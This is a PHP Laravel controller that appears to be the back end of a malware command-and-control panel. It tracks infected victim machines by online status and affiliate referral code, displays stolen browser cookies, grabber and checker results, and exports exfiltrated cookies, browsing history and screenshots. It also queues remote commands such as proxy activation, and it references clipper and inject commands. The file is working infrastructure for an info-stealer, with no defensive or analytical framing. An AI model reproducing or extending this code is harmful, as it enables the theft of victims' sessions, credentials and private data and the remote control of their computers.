<?php

namespace App\Http\Controllers;

use App\Models\Checker;
use App\Models\Command;
use App\Models\Cookie;
use App\Models\CookieFound;
use App\Models\Extension;
use App\Models\Grabber;
use App\Models\Machine;
use App\Models\Setting;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\Storage;

class MachineController extends Controller
{
    public function index()
    {
        $offlineTimeout = Setting::getValue('offline_timeout') ?? 5;

        $user = auth()->user();

        $allMachines = Machine::query();
        $machinesToday = Machine::query()->where('created_at', '>=', \Carbon\Carbon::today());
        $machinesOnline = Machine::query()
            ->where('last_activity', '>=', \Carbon\Carbon::now()->subMinutes(intval($offlineTimeout)))
            ->where('last_activity', '<=', \Carbon\Carbon::now()->addMinutes(intval($offlineTimeout)));

        if ($user->role->slug !== 'admin') {
            $allMachines = $allMachines->where('referral_code', $user->referral_code);
            $machinesToday = $machinesToday->where('referral_code', $user->referral_code);
            $machinesOnline = $machinesOnline->where('referral_code', $user->referral_code);
        }

        $allMachines = $allMachines->count();
        $machinesToday = $machinesToday->count();
        $machinesOnline = $machinesOnline->count();

        $machinesOffline = $allMachines - $machinesOnline;

        return view('pages.machines.index', compact('allMachines', 'machinesToday', 'machinesOffline', 'machinesOnline'));
    }

    public function getItems()
    {
        $items = Machine::with(['cookieFound']);

        $user = auth()->user();

        if ($user->role->slug !== 'admin') {
            $items = $items->where('referral_code', $user->referral_code);
        }

        return datatables($items)->toJson();
    }

    public function getOnlineItems(Request $r)
    {
        $offlineTimeout = Setting::getValue('offline_timeout') ?? 5;

        $items = Machine::with(['cookieFound'])->where('is_archive', false)
            ->where('last_activity', '>=', \Carbon\Carbon::now()->subMinutes(intval($offlineTimeout)))
            ->where('last_activity', '<=', \Carbon\Carbon::now()->addMinutes(intval($offlineTimeout)));

        $user = auth()->user();

        if ($user->role->slug !== 'admin') {
            $items = $items->where('referral_code', $user->referral_code);
        }

        return datatables($items)->toJson();
    }

    public function getOfflineItems()
    {
        $offlineTimeout = Setting::getValue('offline_timeout') ?? 5;

        $items = Machine::with(['cookieFound'])->where('is_archive', false)
            ->where('last_activity', '<=', \Carbon\Carbon::now()->subMinutes(intval($offlineTimeout)));

        $user = auth()->user();

        if ($user->role->slug !== 'admin') {
            $items = $items->where('referral_code', $user->referral_code);
        }

        return datatables($items)->toJson();
    }

    public function getActiveItems()
    {
        $items = Machine::with(['cookieFound'])->where('is_archive', false);

        $user = auth()->user();

        if ($user->role->slug !== 'admin') {
            $items = $items->where('referral_code', $user->referral_code);
        }

        return datatables($items)->toJson();
    }

    public function getArchiveItems()
    {
        $items = Machine::with(['cookieFound'])->where('is_archive', true);

        $user = auth()->user();

        if ($user->role->slug !== 'admin') {
            $items = $items->where('referral_code', $user->referral_code);
        }

        return datatables($items)->toJson();
    }

    public function getItemCookies($id)
    {
        $items = CookieFound::with(['cookieSetting'])->where('machine_id', $id)->get();

        return datatables($items)->toJson();
    }

    public function getItemCommands($id)
    {
        $items = Command::where('machine_id', $id)->get();

        foreach ($items as $key => $item) {
            $item->command = json_decode($item->command, true);

            if ($item->command['cmd'] === 'injects' || $item->command['cmd'] === 'settings' || $item->command['cmd'] === 'clipper') {
                unset($items[$key]);
            }

            if ($item->command['cmd'] === "cookies") {
                $item->download_url = route('machines.cookies.export', ['id' => $item->id]);
            }

            if ($item->command['cmd'] === "screenshot") {
                $item->download_url = route('machines.screenshot', ['id' => $item->id]);
            }

            if ($item->command['cmd'] === 'history') {
                $item->download_url = route('machines.history', ['id' => $item->id]);
            }
        }

        return datatables($items)->toJson();
    }

    public function exportItemCookies($id)
    {
        $items = Storage::disk('public')->get('command_' . $id . '.json');

        $fileName = "cookies.json";

        $headers = [
            'Content-type' => 'text/plain',
            'Content-Disposition' => sprintf('attachment; filename="%s"', $fileName)
        ];

        return Response::make($items, 200, $headers);
    }

    public function exportScreenshot($id)
    {
        $name = 'command_' . $id . '.jpg';

        $file = Storage::disk('public')->get($name);
        $type = Storage::disk('public')->mimeType($name);

        return Response::make($file)->header("Content-Type", $type);
    }

    public function exportHistory($id)
    {
        $items = Storage::disk('public')->get('command_' . $id . '.json');

        $fileName = "history.json";

        $headers = [
            'Content-type' => 'text/plain',
            'Content-Disposition' => sprintf('attachment; filename="%s"', $fileName)
        ];

        return Response::make($items, 200, $headers);
    }

    public function getItemExtensions($id)
    {
        $items = Extension::where('machine_id', $id)->get();

        return datatables($items)->toJson();
    }

    public function getItemGrabbers($id)
    {
        $items = Grabber::where('machine_id', $id)->get();

        return datatables($items)->toJson();
    }

    public function getCheckers($id)
    {
        $items = Checker::where('machine_id', $id)->get();

        return datatables($items)->toJson();
    }

    public function getItem($id)
    {
        $item = Machine::query()->where('id', $id)->first();

        if (!$item) {
            return redirect()->back();
        }

        $offlineTimeout = Setting::getValue('offline_timeout') ?? 5;

        $isOnline = $item->last_activity >= \Carbon\Carbon::now()->subMinutes(intval($offlineTimeout)) && $item->last_activity <= \Carbon\Carbon::now()->addMinutes(intval($offlineTimeout));
        $hardware = json_decode($item->pc_information, true);

        return view('pages.machines.item', compact('item', 'isOnline', 'hardware'));
    }

    public function removeItem($id)
    {
        $item = Machine::query()->where('id', $id)->first();

        if (!$item) {
            return redirect()->back();
        }

        $item->forceDelete();

        return redirect()->back();
    }

    public function archiveItem($id)
    {
        $item = Machine::query()->where('id', $id)->first();

        if (!$item) {
            return redirect()->back();
        }

        $item->update([
            'is_archive' => !$item->is_archive
        ]);

        return redirect()->back();
    }

    public function setProxy($id)
    {
        $item = Machine::query()->where('id', $id)->first();

        if (!$item) {
            return redirect()->back();
        }

        $item->update([
            'is_proxy_enabled' => !$item->is_proxy_enabled
        ]);

        Command::query()->create([
            'machine_id' => $item->id,
            'command' => json_encode([
                'cmd' => 'proxy',
                'uuid' => $item->uuid,
                'data' => [
                    'isEnabled' => $item->is_proxy_enabled
                ]
            ])
        ]);

        return redirect()->back();
    }

    public function setComment($id, Request $r)
    {
        $item = Machine::query()->where('id', $id)->first();

        if (!$item) {
            return redirect()->back();
        }

        $item->update([
            'comment' => $r->post('comment')
        ]);

        return redirect()->back();
    }
}
